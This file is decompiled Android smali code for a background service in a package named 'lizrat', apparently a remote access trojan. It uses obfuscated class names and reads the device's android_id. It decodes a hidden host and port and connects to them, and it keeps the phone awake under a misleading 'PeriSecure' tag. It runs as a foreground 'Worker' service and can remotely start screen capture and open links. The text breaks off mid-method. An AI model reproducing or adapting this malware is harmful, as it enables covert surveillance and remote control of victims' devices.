.class public LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;
.super Landroid/app/Service;
.source "vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33$ta;
    }
.end annotation


# instance fields
.field wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 37
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 135
    iput-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    return-void
.end method

.method public static FPPAGE(Ljava/lang/String;)V
    .locals 3

    .line 738
    sget-object v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    if-eqz v0, :cond_0

    .line 741
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    sget-object v1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    const-class v2, LLiz0rd/lizrat/logicmdragisymposiumbkeyboardsxnetworksqbroughtbtrainthereinzmessageychecklistbcharacterizedz19;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    .line 742
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v1, "key"

    .line 743
    invoke-virtual {v0, v1, p0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 744
    sget-object p0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method

.method private LOGIT(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 8

    :try_start_0
    const-string v0, "com.appser.aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_6

    const/4 v1, 0x0

    .line 760
    :try_start_1
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_6

    goto :goto_0

    :catch_0
    move-exception v0

    .line 762
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6

    move-object v0, v1

    .line 768
    :goto_0
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v2
    :try_end_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/InstantiationException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_6

    goto :goto_2

    :catch_1
    move-exception v2

    .line 772
    :try_start_4
    invoke-virtual {v2}, Ljava/lang/InstantiationException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v2

    .line 770
    invoke-virtual {v2}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    :goto_1
    move-object v2, v1

    :goto_2
    const/4 v3, 0x2

    new-array v4, v3, [Ljava/lang/Class;

    .line 776
    const-class v5, Landroid/content/Context;

    const/4 v6, 0x0

    aput-object v5, v4, v6

    .line 777
    const-class v5, Landroid/content/Intent;

    const/4 v7, 0x1

    aput-object v5, v4, v7

    const-string v5, "U3RhcnROZXdTY2Fu"

    .line 778
    invoke-static {v5}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_6

    .line 782
    :try_start_5
    invoke-virtual {v0, v5, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1
    :try_end_5
    .catch Ljava/lang/NoSuchMethodException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_6

    goto :goto_3

    :catch_3
    move-exception v0

    .line 784
    :try_start_6
    invoke-virtual {v0}, Ljava/lang/NoSuchMethodException;->printStackTrace()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    :goto_3
    :try_start_7
    new-array v0, v3, [Ljava/lang/Object;

    aput-object p1, v0, v6

    aput-object p2, v0, v7

    .line 788
    invoke-virtual {v1, v2, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_7
    .catch Ljava/lang/IllegalAccessException; {:try_start_7 .. :try_end_7} :catch_5
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_7 .. :try_end_7} :catch_4
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    goto :goto_4

    :catch_4
    move-exception p1

    .line 792
    :try_start_8
    invoke-virtual {p1}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V

    goto :goto_4

    :catch_5
    move-exception p1

    .line 790
    invoke-virtual {p1}, Ljava/lang/IllegalAccessException;->printStackTrace()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    :catch_6
    :goto_4
    return-void
.end method

.method public static StartScreen(Ljava/lang/String;)V
    .locals 6

    .line 709
    sget-object v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    if-eqz v0, :cond_1

    :try_start_0
    const-string v0, "on:"

    .line 712
    invoke-virtual {p0, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v1, "key"

    const/high16 v2, 0x800000

    const/high16 v3, 0x10000000

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    .line 714
    :try_start_1
    sput-boolean v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->FO_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_RSC:Z

    .line 715
    new-instance v0, Landroid/content/Intent;

    sget-object v4, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    const-class v5, LLiz0rd/lizrat/SCRActivity;

    invoke-direct {v0, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 716
    invoke-virtual {v0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 717
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 718
    invoke-virtual {v0, v1, p0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 719
    sget-object p0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    .line 722
    sput-boolean p0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->FO_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_RSC:Z

    .line 723
    new-instance p0, Landroid/content/Intent;

    sget-object v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    const-class v4, LLiz0rd/lizrat/SCRActivity;

    invoke-direct {p0, v0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 724
    invoke-virtual {p0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 725
    invoke-virtual {p0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v0, "off"

    .line 726
    invoke-virtual {p0, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 727
    sget-object v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    invoke-virtual {v0, p0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method public static openlink(Ljava/lang/String;)V
    .locals 2

    .line 679
    sget-object v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    if-eqz v0, :cond_0

    .line 682
    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 683
    new-instance v1, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33$2;

    invoke-direct {v1, p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33$2;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    .line 698
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method

.method public static p(Landroid/content/Context;)V
    .locals 7

    const-string v0, ""

    .line 804
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "android_id"

    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 806
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 810
    :catch_0
    :try_start_1
    invoke-static {p0}, LLiz0rd/lizrat/dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9;->GD_dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9_I(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    .line 812
    :goto_0
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    sput-object v2, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->L_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_i:Ljava/util/List;

    .line 813
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    sput-object v2, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->L_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_cl:Ljava/util/List;

    .line 814
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "linux|"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_5

    .line 821
    :try_start_2
    sget-object v2, LLiz0rd/lizrat/dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9;->FTX0:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 822
    :try_start_3
    sget-object v3, LLiz0rd/lizrat/dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9;->FTX1:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 823
    :try_start_4
    sget-object v0, LLiz0rd/lizrat/dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9;->FTX2:Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto :goto_1

    :catch_1
    move-object v3, v0

    goto :goto_1

    :catch_2
    move-object v2, v0

    move-object v3, v2

    .line 825
    :catch_3
    :goto_1
    :try_start_5
    sget-object v4, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->Host:Ljava/lang/String;

    invoke-static {v4}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 826
    sget-object v5, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->Port:Ljava/lang/String;

    invoke-static {v5}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 828
    invoke-static {p0, v2}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->g_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_t(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v6
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    if-nez v6, :cond_0

    .line 832
    :try_start_6
    invoke-static {p0, v1, v2}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->dit(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 835
    :catch_4
    :cond_0
    :try_start_7
    invoke-static {p0, v3}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->g_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_t(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-eqz v1, :cond_1

    .line 836
    invoke-static {p0, v3}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->g_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_t(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 838
    :cond_1
    invoke-static {p0, v0}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->g_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_t(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-eqz v1, :cond_2

    .line 839
    invoke-static {p0, v0}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->g_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_t(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 841
    :cond_2
    invoke-static {v4, v5, p0}, LLiz0rd/lizrat/westrtranscriptstbrickosuperiorncaymanimetalsdbulgariakheldcbadlyrfrontzarcahomeqsymantecz4;->multiplejproducersfverwboolmairplaneiframingrindependentlygadwarescomposedmrolledsinjuredz46(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    const/4 v0, 0x1

    new-array v0, v0, [Landroid/content/Context;

    const/4 v1, 0x0

    aput-object p0, v0, v1

    .line 843
    new-instance p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33$ta;

    invoke-direct {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33$ta;-><init>()V

    invoke-virtual {p0, v0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33$ta;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5

    :catch_5
    return-void
.end method

.method public static showToast(Ljava/lang/String;)V
    .locals 2

    .line 659
    sget-object v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    if-eqz v0, :cond_0

    .line 660
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 661
    new-instance v1, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33$1;

    invoke-direct {v1, p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33$1;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :cond_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 8

    .line 593
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 596
    :try_start_0
    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    .line 597
    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "Battery"

    const-wide/16 v2, 0x4650

    invoke-static {v0, v1, v2, v3}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    const-string v0, "power"

    .line 599
    invoke-virtual {p0, v0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 600
    iget-object v1, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v2, 0x1

    if-nez v1, :cond_0

    const-string v1, "PeriSecure:MyWakeLock"

    .line 602
    invoke-virtual {v0, v2, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 604
    :cond_0
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_1

    .line 606
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-nez v0, :cond_1

    .line 608
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 612
    :cond_1
    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 613
    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v3, 0x7f070002

    invoke-virtual {v1, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    sput-object v1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->p_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_r:Ljava/lang/String;

    .line 614
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v1, v3, :cond_2

    sget-object v1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->p_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_r:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C

    move-result v1

    sget-char v2, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->c1:C
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-ne v1, v2, :cond_2

    :try_start_1
    const-string v1, "Worker"

    const-string v2, "Workers"

    .line 619
    invoke-static {v0, v1, v2}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->Foreground(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Landroid/app/Notification;

    move-result-object v0

    if-eqz v0, :cond_2

    const/16 v1, 0x257a

    .line 624
    invoke-virtual {p0, v1, v0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->startForeground(ILandroid/app/Notification;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_2
    :try_start_2
    const-string v0, "sysdata"

    .line 631
    sput-object v0, LLiz0rd/lizrat/dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9;->FTX0:Ljava/lang/String;

    const-string v0, "appdata"

    .line 632
    sput-object v0, LLiz0rd/lizrat/dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9;->FTX1:Ljava/lang/String;

    const-string v0, "configrs"

    .line 633
    sput-object v0, LLiz0rd/lizrat/dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9;->FTX2:Ljava/lang/String;

    const-string v0, "sysinfo"

    .line 634
    sput-object v0, LLiz0rd/lizrat/dumbaimaginationjlayhhelpingzeffectsfcoralcguyajavalusdevoyuereaudiencewchristophergahwbushk9;->FTX3:Ljava/lang/String;

    .line 635
    new-instance v0, Ljava/util/concurrent/ThreadPoolExecutor;

    const/16 v2, 0x8

    const/16 v3, 0xf

    const-wide/16 v4, 0x1

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MINUTES:Ljava/util/concurrent/TimeUnit;

    new-instance v7, Ljava/util/concurrent/ArrayBlockingQueue;

    sget v1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->m_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_ax:I

    invoke-direct {v7, v1}, Ljava/util/concurrent/ArrayBlockingQueue;-><init>(I)V

    move-object v1, v0

    invoke-direct/range {v1 .. v7}, Ljava/util/concurrent/ThreadPoolExecutor;-><init>(IIJLjava/util/concurrent/TimeUnit;Ljava/util/concurrent/BlockingQueue;)V

